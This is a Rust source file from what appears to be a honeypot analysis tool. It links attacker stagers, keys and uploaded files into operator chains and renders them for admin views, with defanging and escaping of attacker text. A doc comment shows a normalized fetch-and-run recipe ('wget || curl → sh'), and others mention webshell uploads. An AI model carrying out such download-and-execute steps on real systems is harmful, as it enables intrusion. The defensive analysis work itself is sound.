@@ -1,0 +1,3950 @@
+//! Chains: groups of joiner pieces ([`super::pieces`]) one operator is
+//! behind. A sighting with the role `stager`, `key` or `file` is a joiner
+//! (the role, not the kind: every URL piece has the kind `stager`). Two
+//! joiners connect only when they appear together in sources from at least
+//! two addresses and a tenth of the larger joiner's, so a forged body naming
+//! two stagers fuses nothing, and a shared recipe or one address using both
+//! connects nothing. A joiner that connects to none is a chain of its own.
+//!
+//! A chain's sources are the sources holding one of its joiners, and its
+//! describers the ones sighted in those sources. What came after an upload
+//! is tied through the file ([`follow_ups`], [`dead_ends`]), never through
+//! the address, so a noisy scanner cannot fill a chain.
+//!
+//! A pass reads each address's first [`MAX_JOINERS_PER_IP`] joiners, in SQL,
+//! so what it holds grows with addresses and what they name, not with what
+//! they send ([`ranked_joiners`]); describers stop at [`DESCRIBERS_MAX`] per
+//! joiner. An address over the cap is listed in the campaign report.
+//!
+//! Derived on each node from its sightings, rebuilt in the campaign pass
+//! ([`plan`] in its read snapshot, [`store_plan`] in its write transaction),
+//! never replicated, never exported.
+//!
+//! [`Store::chains_of`] is the only way views read a chain: from a request,
+//! an upload, an address, a campaign or a piece, always as the same five
+//! [`Stage`]s. It reads upload metadata, never upload content.
+use super::Store;
+use super::browse::{PAGE_SIZE, Page, offset};
+use super::campaigns::{HARD_FANOUT_MAX, MAX_JOINERS_PER_IP};
+use super::pieces::PieceResult;
+use super::uploads::{self, HELD_TEXT, TimelineRow, UPLOAD_COLS, UploadRow};
+use crate::admin::views::link_href;
+use crate::model::defang::defang;
+use crate::model::xray::key::{holds_key, masked};
+use crate::model::xray::{LayerKind, Policy, Source, Xray, parse};
+use crate::trap::decoy::keeps_its_own_answer;
+use anyhow::Result;
+use sqlx::SqliteConnection;
+use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
+
+/// Stored with each chain; a new version rebuilds them.
+pub const CHAIN_V: i64 = 1;
+
+const REQUEST: u8 = 0;
+const UPLOAD: u8 = 1;
+
+/// The roles that join, for a `role IN` clause.
+pub(super) const JOINER_ROLES: &str = "('stager', 'key', 'file')";
+/// The kinds that join: a piece of one in a chain is a joiner of it.
+const JOINER_KINDS: &str = "('stager', 'key', 'file')";
+/// The kinds that describe.
+const DESCRIBER_KINDS: &str = "('exploit', 'recipe', 'tag', 'shell-profile')";
+
+/// Most joiners a source may name and still connect them. A body can name
+/// 256 pieces, so 32,640 pairs; no real source names this many, so a source
+/// over it costs no pair. Its joiners stay chains, it just joins none. Each
+/// address keeps fewer than this, so it is what a source names that counts.
+const PAIRED_JOINERS_MAX: usize = 64;
+/// Most describers a pass keeps per joiner, the newest: a body can name 255
+/// fresh ones ten times a second, and a chain shows [`FOUND_MAX`] pieces.
+const DESCRIBERS_MAX: usize = 512;
+/// Most lists a pass keeps per address, those of the most sources. An
+/// address can send each subset of its kept joiners, 2^16 of them; the rest
+/// fold into one list of all it kept.
+const LISTS_PER_IP: i64 = 256;
+/// Rows per `INSERT`: well under SQLite's bound variables.
+const INSERT_BATCH: usize = 400;
+
+/// Most uploads of a chain [`follow_ups`] and [`dead_ends`] read, newest
+/// first: each is a query, and a botnet's chain can hold thousands.
+const UPLOADS_MAX: i64 = 64;
+/// A dead end: asked for within this long after the upload.
+const DEAD_END_SECS: i64 = 60;
+
+/// Most uploads whose timelines and dead ends a chain reads, newest first.
+const TIMELINE_UPLOADS: usize = 8;
+/// Most follow-ups a chain reads through the X-ray, in order. The rest are
+/// counted.
+const FOLLOW_READS_MAX: usize = 32;
+/// Most pieces a chain shows, joiners first. The rest are counted.
+const FOUND_MAX: usize = 200;
+/// Newest sources a chain's strip reads: its pairs of exploits and tags, and
+/// how many of them hold each piece.
+const TAG_SOURCES_MAX: i64 = 2000;
+/// Newest joiners of a chain those sources are read from.
+const SOURCE_JOINERS_MAX: i64 = 64;
+/// Newest sightings of a piece read for its roles when it is not in those
+/// sources. A piece's kind sets its grade, and only `stager` has more roles.
+const OLD_SIGHTINGS_MAX: i64 = 64;
+
+/// Most chains [`Store::chains_of`] builds: one forged body can name 256
+/// stagers, each its own chain.
+const CHAINS_MAX: usize = 32;
+/// Most sources a chain of one shared describer reads, newest first.
+const SHARED_SOURCES_MAX: i64 = 500;
+/// The roles a strip shows. Queried and self-hosted URLs never appear.
+const STRIP_ROLES: &str = "('exploit', 'tag', 'recipe', 'stager', 'key', 'file')";
+/// Longest label, in characters: a recipe can be 512 bytes.
+const LABEL_MAX: usize = 160;
+/// Sandbox results one chain shows.
+const CHAIN_RESULTS_MAX: i64 = 64;
+/// Paths an Exploit row lists.
+const ROW_PATHS_MAX: usize = 6;
+
+/// A joiner on one address.
+pub struct JoinerSpan {
+    piece: i64,
+    ip: i64,
+    first: String,
+    last: String,
+}
+
+/// The sources of one address that name these joiners, in order, and no
+/// others of those it kept: what a chain's source count reads. An address
+/// sending one list a million times is one row, so what a pass holds grows
+/// with what addresses name, not with how often they send it. Past
+/// [`LISTS_PER_IP`] lists, one more holds the rest's count and all the
+/// address kept, so their sources count toward each of its chains.
+pub struct JoinerList {
+    /// Read by the tests; a count needs only the joiners.
+    #[cfg_attr(not(test), allow(dead_code))]
+    ip: i64,
+    joiners: Vec<i64>,
+    sources: i64,
+}
+
+/// Two joiners an address kept that one of its sources names together, of
+/// at most [`PAIRED_JOINERS_MAX`] joiners; `a < b`. At most 120 per address.
+pub struct JoinerPair {
+    ip: i64,
+    a: i64,
+    b: i64,
+}
+
+/// A chain as [`connect`] finds it.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct ChainOut {
+    /// The oldest joiner's hash, as 16 lowercase hex digits. It stays as a
+    /// chain grows with newer joiners, but it changes when two chains merge
+    /// or an older sighting arrives: views must not treat it as permanent.
+    key: String,
+    first_seen: String,
+    last_seen: String,
+    ips: i64,
+    /// How many sources hold one of its joiners.
+    sources: i64,
+    /// In order.
+    joiners: Vec<i64>,
+}
+
+/// The root of `x`'s group. A root has no entry in `parent`.
+fn find(parent: &mut HashMap<i64, i64>, x: i64) -> i64 {
+    let mut root = x;
+    while let Some(&up) = parent.get(&root) {
+        root = up;
+    }
+    let mut at = x;
+    while at != root {
+        at = parent.insert(at, root).unwrap_or(root);
+    }
+    root
+}
+
+/// How many addresses must name two joiners together, of how many name each:
+/// two, and a tenth of the larger, the campaign pass's rule for joiner values.
+fn addresses_to_connect(a: usize, b: usize) -> usize {
+    a.max(b).div_ceil(10).max(2)
+}
+
+/// The joiner pairs that appear together in sources from enough addresses
+/// ([`addresses_to_connect`]), as a union of everything each joins:
+/// `piece -> parent`.
+fn unions(spans: &[JoinerSpan], named: &[JoinerPair]) -> HashMap<i64, i64> {
+    let mut addresses: HashMap<i64, usize> = HashMap::new();
+    for s in spans {
+        *addresses.entry(s.piece).or_default() += 1;
+    }
+    let on = |j: i64| addresses.get(&j).copied().unwrap_or(0);
+    let mut parent = HashMap::new();
+    // The addresses of each pair, until there are enough. A joiner on one
+    // address cannot connect, so it costs no entry.
+    let mut pairs: HashMap<(i64, i64), HashSet<i64>> = HashMap::new();
+    for &JoinerPair { ip, a, b } in named {
+        if on(a) < 2 || on(b) < 2 {
+            continue;
+        }
+        let need = addresses_to_connect(on(a), on(b));
+        let seen = pairs.entry((a, b)).or_default();
+        if seen.len() < need && seen.insert(ip) && seen.len() == need {
+            let (ra, rb) = (find(&mut parent, a), find(&mut parent, b));
+            if ra != rb {
+                parent.insert(ra, rb);
+            }
+        }
+    }
+    parent
+}
+
+/// The chains these joiners form, by key.
+pub(crate) fn connect(
+    spans: &[JoinerSpan],
+    pairs: &[JoinerPair],
+    lists: &[JoinerList],
+) -> Vec<ChainOut> {
+    #[derive(Default)]
+    struct Group<'a> {
+        /// Each joiner's oldest sighting.
+        joiners: BTreeMap<i64, &'a str>,
+        ips: HashSet<i64>,
+        sources: i64,
+        first: &'a str,
+        last: &'a str,
+    }
+    let mut parent = unions(spans, pairs);
+    let mut groups: HashMap<i64, Group> = HashMap::new();
+    for s in spans {
+        let g = groups.entry(find(&mut parent, s.piece)).or_default();
+        let oldest = g.joiners.entry(s.piece).or_insert(&s.first);
+        *oldest = (*oldest).min(&s.first);
+        g.ips.insert(s.ip);
+        if g.first.is_empty() || s.first.as_str() < g.first {
+            g.first = &s.first;
+        }
+        g.last = g.last.max(&s.last);
+    }
+    for list in lists {
+        // Once per chain: a source's joiners can be of one or of several.
+        let roots: BTreeSet<i64> = list.joiners.iter().map(|&j| find(&mut parent, j)).collect();
+        for root in roots {
+            if let Some(g) = groups.get_mut(&root) {
+                g.sources += list.sources;
+            }
+        }
+    }
+    let mut out: Vec<ChainOut> = groups
+        .into_values()
+        .map(|g| {
+            let oldest = g
+                .joiners
+                .iter()
+                .min_by_key(|&(hash, ts)| (*ts, *hash))
+                .map_or(0, |(hash, _)| *hash);
+            ChainOut {
+                key: format!("{:016x}", oldest as u64),
+                first_seen: g.first.to_string(),
+                last_seen: g.last.to_string(),
+                ips: g.ips.len() as i64,
+                sources: g.sources,
+                joiners: g.joiners.into_keys().collect(),
+            }
+        })
+        .collect();
+    out.sort_by(|a, b| a.key.cmp(&b.key));
+    out
+}
+
+fn source_of(kind: &str, id: i64) -> (u8, i64) {
+    (if kind == "upload" { UPLOAD } else { REQUEST }, id)
+}
+
+/// Common table expressions ending in `ranked`: each address's joiners, one
+/// row per joiner and address, with their first and last sighting, `held`,
+/// how many of them another address names too, and two ranks. Those two addresses name come
+/// first, as only they can connect anything, then the newest. `nth` is a row
+/// number; `tied` leaves joiners of one second level. A file on more than
+/// [`HARD_FANOUT_MAX`] addresses is left out, counted from the sightings as
+/// `pieces.ips` can lag: it is a public webshell, not an operator.
+///
+/// Both the chains and the campaigns read through this, so one address
+/// holds at most [`MAX_JOINERS_PER_IP`] of them in memory however many it
+/// sent: a body can name 256 fresh ones, ten times a second.
+pub(super) fn ranked_joiners() -> String {
+    format!(
+        "named (role, piece, ip_id, first_ts, last_ts) AS (
+           SELECT role, piece, ip_id, MIN(ts), MAX(ts) FROM piece_sightings
+           WHERE role IN {JOINER_ROLES} GROUP BY role, piece, ip_id),
+         spread (piece, ips) AS (SELECT piece, COUNT(*) FROM named GROUP BY piece),
+         listed AS (
+           SELECT n.*, s.ips >= 2 AS shared FROM named n JOIN spread s ON s.piece = n.piece
+           WHERE n.role <> 'file' OR s.ips <= {HARD_FANOUT_MAX}),
+         ranked AS (
+           SELECT *,
+             ROW_NUMBER() OVER (PARTITION BY ip_id ORDER BY shared DESC, last_ts DESC, piece)
+               AS nth,
+             RANK() OVER (PARTITION BY ip_id ORDER BY shared DESC, last_ts DESC) AS tied,
+             SUM(shared) OVER (PARTITION BY ip_id) AS held
+           FROM listed)"
+    )
+}
+
+/// What each address names, within [`MAX_JOINERS_PER_IP`].
+async fn joiner_spans(conn: &mut SqliteConnection) -> Result<Vec<JoinerSpan>> {
+    let rows: Vec<(i64, i64, String, String)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "WITH {} SELECT piece, ip_id, first_ts, last_ts FROM ranked WHERE nth <= ?",
+        ranked_joiners()
+    )))
+    .bind(MAX_JOINERS_PER_IP as i64)
+    .fetch_all(&mut *conn)
+    .await?;
+    Ok(rows
+        .into_iter()
+        .map(|(piece, ip, first, last)| JoinerSpan {
+            piece,
+            ip,
+            first,
+            last,
+        })
+        .collect())
+}
+
+/// Which of [`joiner_spans`] the sources name together, for the counts:
+/// at most [`LISTS_PER_IP`] lists per address, and one of the rest.
+async fn joiner_lists(conn: &mut SqliteConnection) -> Result<Vec<JoinerList>> {
+    let rows: Vec<(i64, String, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "WITH {},
+         kept AS (SELECT piece, ip_id FROM ranked WHERE nth <= ?1),
+         sources AS (
+           SELECT g.ip_id, group_concat(k.piece, ',' ORDER BY k.piece) AS list
+           FROM piece_sightings g LEFT JOIN kept k ON k.piece = g.piece AND k.ip_id = g.ip_id
+           WHERE g.role IN {JOINER_ROLES} GROUP BY g.source_kind, g.source_id),
+         lists AS (
+           SELECT ip_id, list, COUNT(*) AS n FROM sources
+           WHERE list IS NOT NULL GROUP BY ip_id, list),
+         ordered AS (
+           SELECT *, ROW_NUMBER() OVER (PARTITION BY ip_id ORDER BY n DESC, list) AS r
+           FROM lists)
+         SELECT ip_id, list, n FROM ordered WHERE r <= ?2
+         UNION ALL
+         SELECT o.ip_id,
+                (SELECT group_concat(k.piece, ',' ORDER BY k.piece) FROM kept k
+                 WHERE k.ip_id = o.ip_id),
+                SUM(o.n)
+         FROM ordered o WHERE o.r > ?2 GROUP BY o.ip_id",
+        ranked_joiners()
+    )))
+    .bind(MAX_JOINERS_PER_IP as i64)
+    .bind(LISTS_PER_IP)
+    .fetch_all(&mut *conn)
+    .await?;
+    Ok(rows
+        .into_iter()
+        .map(|(ip, list, sources)| JoinerList {
+            ip,
+            joiners: list.split(',').filter_map(|j| j.parse().ok()).collect(),
+            sources,
+        })
+        .collect())
+}
+
+/// The pairs of [`joiner_spans`] one source names together, once per
+/// address, from sources of at most [`PAIRED_JOINERS_MAX`] joiners.
+async fn joiner_pairs(conn: &mut SqliteConnection) -> Result<Vec<JoinerPair>> {
+    let rows: Vec<(i64, i64, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "WITH {},
+         kept AS (SELECT piece, ip_id FROM ranked WHERE nth <= ?1),
+         small AS (
+           SELECT source_kind, source_id FROM piece_sightings
+           WHERE role IN {JOINER_ROLES}
+           GROUP BY source_kind, source_id HAVING COUNT(*) <= ?2),
+         inside AS (
+           SELECT g.source_kind, g.source_id, g.ip_id, g.piece
+           FROM piece_sightings g
+           JOIN kept k ON k.piece = g.piece AND k.ip_id = g.ip_id
+           JOIN small s ON s.source_kind = g.source_kind AND s.source_id = g.source_id
+           WHERE g.role IN {JOINER_ROLES})
+         SELECT DISTINCT a.ip_id, a.piece, b.piece FROM inside a JOIN inside b
+           ON b.source_kind = a.source_kind AND b.source_id = a.source_id
+          AND b.piece > a.piece",
+        ranked_joiners()
+    )))
+    .bind(MAX_JOINERS_PER_IP as i64)
+    .bind(PAIRED_JOINERS_MAX as i64)
+    .fetch_all(&mut *conn)
+    .await?;
+    Ok(rows
+        .into_iter()
+        .map(|(ip, a, b)| JoinerPair { ip, a, b })
+        .collect())
+}
+
+/// What a pass will store.
+pub struct Plan {
+    chains: Vec<ChainOut>,
+    /// Index into `chains`, and a piece: its joiners and describers.
+    members: Vec<(usize, i64)>,
+}
+
+/// Read the sightings and work out the chains, in memory. Called in the
+/// pass's read snapshot, so the write lock is not held for any of this.
+pub async fn plan(conn: &mut SqliteConnection) -> Result<Plan> {
+    let spans = joiner_spans(conn).await?;
+    let pairs = joiner_pairs(conn).await?;
+    let lists = joiner_lists(conn).await?;
+    let chains = connect(&spans, &pairs, &lists);
+    let mut chain_of: HashMap<i64, usize> = HashMap::new();
+    let mut members: BTreeSet<(usize, i64)> = BTreeSet::new();
+    for (i, c) in chains.iter().enumerate() {
+        chain_of.extend(c.joiners.iter().map(|&j| (j, i)));
+        members.extend(c.joiners.iter().map(|&j| (i, j)));
+    }
+    let describers: Vec<(i64, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "WITH {},
+         kept AS (SELECT piece, ip_id FROM ranked WHERE nth <= ?1),
+         beside AS (
+           SELECT j.piece AS joiner, g.piece AS piece, MAX(g.ts) AS last_ts
+           FROM kept k
+           JOIN piece_sightings j ON j.piece = k.piece AND j.ip_id = k.ip_id
+           JOIN piece_sightings g
+             ON g.source_kind = j.source_kind AND g.source_id = j.source_id
+           JOIN pieces p ON p.hash = g.piece
+           WHERE j.role IN {JOINER_ROLES} AND p.kind IN {DESCRIBER_KINDS}
+           GROUP BY j.piece, g.piece)
+         SELECT joiner, piece FROM (
+           SELECT joiner, piece, ROW_NUMBER() OVER
+             (PARTITION BY joiner ORDER BY last_ts DESC, piece) AS n
+           FROM beside)
+         WHERE n <= ?2",
+        ranked_joiners()
+    )))
+    .bind(MAX_JOINERS_PER_IP as i64)
+    .bind(DESCRIBERS_MAX as i64)
+    .fetch_all(&mut *conn)
+    .await?;
+    for (joiner, piece) in describers {
+        if let Some(&i) = chain_of.get(&joiner) {
+            members.insert((i, piece));
+        }
+    }
+    Ok(Plan {
+        chains,
+        members: members.into_iter().collect(),
+    })
+}
+
+/// `n` rows of `row`, for a `VALUES` clause.
+fn values(row: &str, n: usize) -> String {
+    vec![row; n].join(",")
+}
+
+/// Replace every chain with `plan`: only writes, in the transaction that
+/// rebuilds the campaigns.
+pub async fn store_plan(tx: &mut SqliteConnection, plan: &Plan) -> Result<()> {
+    for sql in ["DELETE FROM chain_pieces", "DELETE FROM chains"] {
+        sqlx::query(sql).execute(&mut *tx).await?;
+    }
+    for batch in plan.chains.chunks(INSERT_BATCH) {
+        let sql = format!(
+            "INSERT INTO chains (key, first_seen, last_seen, ips, sources, v) VALUES {}",
+            values("(?,?,?,?,?,?)", batch.len())
+        );
+        let mut q = sqlx::query(sqlx::AssertSqlSafe(sql));
+        for c in batch {
+            q = q
+                .bind(&c.key)
+                .bind(&c.first_seen)
+                .bind(&c.last_seen)
+                .bind(c.ips)
+                .bind(c.sources)
+                .bind(CHAIN_V);
+        }
+        q.execute(&mut *tx).await?;
+    }
+    for batch in plan.members.chunks(INSERT_BATCH) {
+        let sql = format!(
+            "INSERT INTO chain_pieces (chain, piece) VALUES {}",
+            values("(?,?)", batch.len())
+        );
+        let mut q = sqlx::query(sqlx::AssertSqlSafe(sql));
+        for &(i, piece) in batch {
+            q = q.bind(&plan.chains[i].key).bind(piece);
+        }
+        q.execute(&mut *tx).await?;
+    }
+    Ok(())
+}
+
+/// The uploads holding one of the chain's joiners, newest first, at most
+/// [`UPLOADS_MAX`].
+pub async fn uploads_of(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<UploadRow>> {
+    Ok(sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT {UPLOAD_COLS} WHERE u.id IN
+           (SELECT g.source_id FROM chain_pieces c JOIN pieces p ON p.hash = c.piece
+            JOIN piece_sightings g ON g.piece = c.piece
+            WHERE c.chain = ? AND p.kind IN {JOINER_KINDS} AND g.source_kind = 'upload'
+              AND g.role IN {JOINER_ROLES})
+         ORDER BY u.id DESC LIMIT ?"
+    )))
+    .bind(chain)
+    .bind(UPLOADS_MAX)
+    .fetch_all(&mut *conn)
+    .await?)
+}
+
+/// What was sent to the chain's files, oldest first, at most
+/// [`uploads::TIMELINE_MAX`]: the timelines of its newest
+/// [`TIMELINE_UPLOADS`] uploads, from any address,
+/// without the requests to a path the trap answers itself. Until `411e2a6`
+/// a `PUT /` or `PUT /.env` made that path answer as a webshell for everyone,
+/// so those rows, `webshell` or not, are ordinary traffic and stay out. A
+/// request two uploads share belongs to the newer: its file is what answered.
+pub async fn follow_ups(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<TimelineRow>> {
+    let uploads = uploads_of(conn, chain).await?;
+    follow_ups_of(conn, &uploads).await
+}
+
+/// [`follow_ups`] of these uploads.
+async fn follow_ups_of(
+    conn: &mut SqliteConnection,
+    uploads: &[UploadRow],
+) -> Result<Vec<TimelineRow>> {
+    let newest = &uploads[..uploads.len().min(TIMELINE_UPLOADS)];
+    let age: HashMap<&str, usize> = newest
+        .iter()
+        .enumerate()
+        .map(|(i, u)| (u.uid.as_str(), i))
+        .collect();
+    let mut timelines = uploads::timelines(conn, newest).await?;
+    timelines.sort_by_key(|r| std::cmp::Reverse(age.get(r.upload.as_str()).copied()));
+    let mut rows = BTreeMap::new();
+    for r in timelines {
+        if !keeps_its_own_answer(&r.method, &r.path, r.query.as_deref()) {
+            rows.insert((r.ts.clone(), r.id), r);
+        }
+    }
+    let rows = rows.into_values();
+    Ok(rows.take(uploads::TIMELINE_MAX as usize).collect())
+}
+
+/// The name a client would ask for the file by: the one it sent, without
+/// directories, or for a `PUT`, which sends none, the end of the path.
+fn file_name(u: &UploadRow) -> Option<&str> {
+    let sent = u.filename.as_deref().filter(|f| !f.is_empty());
+    let name = sent.unwrap_or(&u.answered_path);
+    name.rsplit(['/', '\\']).next().filter(|n| !n.is_empty())
+}
+
+/// The dead ends of the chain's files, oldest first, at most
+/// [`uploads::TIMELINE_MAX`], from its newest [`TIMELINE_UPLOADS`] uploads.
+pub async fn dead_ends(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<TimelineRow>> {
+    let uploads = uploads_of(conn, chain).await?;
+    dead_ends_for(conn, &uploads).await
+}
+
+/// The requests that found nothing where an upload was expected: the same
+/// address, within [`DEAD_END_SECS`] after the upload, asks the same origin
+/// for a path ending in the file's name and gets a 404. `substr`, not
+/// `LIKE`: a `_` or `%` in the name is no wildcard. One statement, with a
+/// limit per upload.
+async fn dead_ends_for(
+    conn: &mut SqliteConnection,
+    uploads: &[UploadRow],
+) -> Result<Vec<TimelineRow>> {
+    let newest = &uploads[..uploads.len().min(TIMELINE_UPLOADS)];
+    let named: Vec<(&UploadRow, String)> = newest
+        .iter()
+        .filter_map(|u| file_name(u).map(|n| (u, format!("/{n}"))))
+        .collect();
+    if named.is_empty() {
+        return Ok(vec![]);
+    }
+    let one = "SELECT * FROM (
+         SELECT r.id, r.ts, i.ip, r.method, r.path, r.query, r.status, r.answer
+         FROM requests r JOIN ips i ON i.id = r.ip_id
+         WHERE i.ip = ? AND r.origin IS ? AND r.status = 404
+           AND substr(r.path, -length(?)) = ?
+           AND r.ts <= datetime(?, ?)
+           AND (r.ts > ? OR (r.ts = ? AND r.id > ?))
+         ORDER BY r.ts, r.id LIMIT ?)";
+    let sql = vec![one; named.len()].join(" UNION ALL ");
+    let mut q = sqlx::query_as::<_, TimelineRow>(sqlx::AssertSqlSafe(sql));
+    for (u, name) in &named {
+        q = q
+            .bind(&u.ip)
+            .bind(&u.origin)
+            .bind(name)
+            .bind(name)
+            .bind(&u.ts)
+            .bind(format!("+{DEAD_END_SECS} seconds"))
+            .bind(&u.ts)
+            .bind(&u.ts)
+            .bind(u.request_id.unwrap_or(i64::MAX))
+            .bind(uploads::TIMELINE_MAX);
+    }
+    let mut rows = BTreeMap::new();
+    for r in q.fetch_all(&mut *conn).await? {
+        rows.insert((r.ts.clone(), r.id), r);
+    }
+    let rows = rows.into_values();
+    Ok(rows.take(uploads::TIMELINE_MAX as usize).collect())
+}
+
+/// Most recent uploads [`Store::dead_ends_all`] reads.
+const DEAD_END_UPLOADS: i64 = 512;
+
+/// A path asked for after an upload, where the trap had no file: grouped by
+/// path across the cluster.
+#[derive(Debug, Clone)]
+pub struct DeadEnd {
+    pub path: String,
+    /// The path as shown: defanged, since the client chose it.
+    pub shown: String,
+    pub hits: i64,
+    pub ips: i64,
+    pub last_seen: String,
+}
+
+/// What a chain is read from.
+#[derive(Debug, Clone, Copy)]
+pub enum Anchor<'a> {
+    /// A request, with the uploads it carried.
+    Request(i64),
+    /// An upload by uid, with the request that carried it.
+    Upload(&'a str),
+    /// An address's id.
+    Ip(i64),
+    /// A campaign's key.
+    Campaign(&'a str),
+    /// A piece's hash.
+    Piece(i64),
+}
+
+/// How far a row is confirmed. Pages show [`Mark::word`] as well as a line
+/// style, so it never rests on the look alone.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Mark {
+    /// The trap received or held it.
+    Seen,
+    /// The attacker's text says so; nothing confirmed it.
+    Claimed,
+    /// An operator entered it from outside analysis.
+    External,
+    /// Nothing is known here.
+    Gap,
+    /// The trap stopped the chain here.
+    DeadEnd,
+}
+
+impl Mark {
+    pub fn word(self) -> &'static str {
+        match self {
+            Mark::Seen => "seen",
+            Mark::Claimed => "claimed",
+            Mark::External => "external",
+            Mark::Gap => "gap",
+            Mark::DeadEnd => "dead end",
+        }
+    }
+
+    /// Its CSS class.
+    pub fn class(self) -> &'static str {
+        match self {
+            Mark::Seen => "seen",
+            Mark::Claimed => "claimed",
+            Mark::External => "external",
+            Mark::Gap => "gap",
+            Mark::DeadEnd => "dead-end",
+        }
+    }
+}
+
+/// One row of a stage. `label` and `detail` are defanged and still attacker
+/// text: pages escape them, and only `href`, always one of ours, is a link.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct StageRow {
+    pub piece: Option<i64>,
+    pub label: String,
+    pub detail: String,
+    pub mark: Mark,
+    /// It ties this chain together.
+    pub joiner: bool,
+    /// It belongs to the anchor.
+    pub here: bool,
+    /// The anchor is a source, and did not use this stage.
+    pub dim: bool,
+    pub href: Option<String>,
+    /// How many requests (or uploads) stand behind it; 0 where it is a
+    /// label only, such as a gap or an entered result. The flow map sizes
+    /// its bands by it.
+    pub requests: i64,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Stage {
+    pub name: &'static str,
+    pub rows: Vec<StageRow>,
+}
+
+/// A chain as views read it. `key` is `None` for what has no joiner: one
+/// source's own pieces, or the sources sharing a describer.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Chain {
+    pub key: Option<String>,
+    /// `Exploit`, `Command`, `Delivery`, `Payload`, `Follow-up`.
+    pub stages: [Stage; 5],
+    pub ips: i64,
+    pub sources: i64,
+    pub first_seen: String,
+    pub last_seen: String,
+    /// Pieces past [`FOUND_MAX`], in no stage.
+    pub more: i64,
+}
+
+impl Chain {
+    /// The joiner that names it: the oldest, whose hash is the key.
+    fn name_row(&self) -> Option<&StageRow> {
+        let rows = &self.stages[2].rows;
+        let oldest = self.key.as_deref().and_then(key_piece);
+        rows.iter()
+            .find(|r| r.joiner && r.piece == oldest)
+            .or_else(|| rows.iter().find(|r| r.joiner))
+    }
+
+    /// What pages call it.
+    pub fn title(&self) -> String {
+        self.name_row()
+            .map_or_else(|| "no joiner".to_string(), |r| r.label.clone())
+    }
+
+    /// Where it has its page: its joiner's.
+    pub fn href(&self) -> Option<&str> {
+        self.name_row().and_then(|r| r.href.as_deref())
+    }
+}
+
+/// The piece a chain's key names.
+fn key_piece(key: &str) -> Option<i64> {
+    u64::from_str_radix(key, 16).ok().map(|h| h as i64)
+}
+
+/// What a row belongs to, for its `here` and `dim`.
+#[derive(Default)]
+struct Here {
+    pieces: HashSet<i64>,
+    requests: HashSet<i64>,
+    uploads: HashSet<String>,
+    /// A source: stages it did not use are dimmed.
+    dim: bool,
+}
+
+/// A piece in a chain, in one role.
+#[derive(sqlx::FromRow)]
+struct Found {
+    hash: i64,
+    kind: String,
+    value: String,
+    role: String,
+    seen: bool,
+    ips: i64,
+    /// Requests and uploads of this chain that named it in this role.
+    sources: i64,
+}
+
+impl Found {
+    fn mark(&self) -> Mark {
+        if self.seen { Mark::Seen } else { Mark::Claimed }
+    }
+
+    /// Its page under Links, for the kinds that have one.
+    fn href(&self) -> Option<String> {
+        let kind = match self.kind.as_str() {
+            "stager" | "key" | "file" | "recipe" => self.kind.as_str(),
+            "tag" => "exploit-tag",
+            _ => return None,
+        };
+        Some(link_href(kind, &self.value))
+    }
+
+    fn on_addresses(&self, what: &str) -> String {
+        if self.ips > 0 {
+            format!("{what} · {}", count(self.ips, "address", "addresses"))
+        } else {
+            what.to_string()
+        }
+    }
+}
+
+fn count(n: i64, one: &str, many: &str) -> String {
+    format!("{n} {}", if n == 1 { one } else { many })
+}
+
+/// `s` as a label: defanged, and cut to [`LABEL_MAX`].
+fn label(s: &str) -> String {
+    let shown = defang(s);
+    match shown.char_indices().nth(LABEL_MAX) {
+        Some((end, _)) => format!("{}…", &shown[..end]),
+        None => shown,
+    }
+}
+
+/// A step of a recipe's normal form in a word; `None` for what only readies
+/// things, which a label does not need.
+fn recipe_word(step: &str) -> Option<&str> {
+    // A step the piece limit cut has no `)`: its word may be cut too.
+    let (name, inner) = step.trim_end().split_once('(')?;
+    let word = inner.strip_suffix(')')?.split(' ').next()?;
+    match (name, word) {
+        ("run", "<file>") => Some("run"),
+        ("other", "<word>") => None,
+        ("fetch" | "run" | "other", word) => Some(word),
+        _ => None,
+    }
+}
+
+/// `items` in order. A group with an `else` inside is put in brackets when
+/// something follows it, so it is clear where the `else` ends.
+fn recipe_steps(items: &[String]) -> String {
+    let last = items.len().saturating_sub(1);
+    let shown = items.iter().enumerate().map(|(i, item)| {
+        if i < last && item.contains(" → else ") {
+            format!("({item})")
+        } else {
+            item.clone()
+        }
+    });
+    shown.collect::<Vec<_>>().join(" → ")
+}
+
+/// Both branches of a recipe's `try`, as one item.
+fn recipe_branches(first: Vec<String>, fallback: Vec<String>) -> Vec<String> {
+    if first.is_empty() || fallback.is_empty() {
+        return if first.is_empty() { fallback } else { first };
+    }
+    match (first.as_slice(), fallback.as_slice()) {
+        ([a], [b]) if !a.contains(" → ") && !b.contains(" → ") => {
+            if a.split(" || ").any(|tool| tool == b) {
+                first
+            } else {
+                vec![format!("{a} || {b}")]
+            }
+        }
+        _ => {
+            let (a, b) = (recipe_steps(&first), recipe_steps(&fallback));
+            vec![format!("{a} → else {b}")]
+        }
+    }
+}
+
+/// A group of a recipe's normal form while it is read; `tried` is the `try`
+/// part once its `else` is reached.
+#[derive(Default)]
+struct RecipeGroup {
+    items: Vec<String>,
+    tried: Option<Vec<String>>,
+}
+
+/// A recipe's normal form as a label: what it fetches and runs, every
+/// branch kept, like `scp → run → else wget || curl → sh`. The piece's page
+/// has the whole form. Written by the parser, but read as any text: a value
+/// cut at the piece limit just ends its open groups. A form with nothing to
+/// show comes back as it is.
+fn compact_recipe(normal: &str) -> String {
+    fn close(group: RecipeGroup, into: &mut Vec<String>) {
+        into.extend(match group.tried {
+            Some(first) => recipe_branches(first, group.items),
+            None => group.items,
+        });
+    }
+    let (mut rest, mut root, mut open) = (normal, vec![], Vec::<RecipeGroup>::new());
+    loop {
+        rest = rest.trim_start_matches([' ', '→', '|']);
+        if rest.is_empty() {
+            break;
+        }
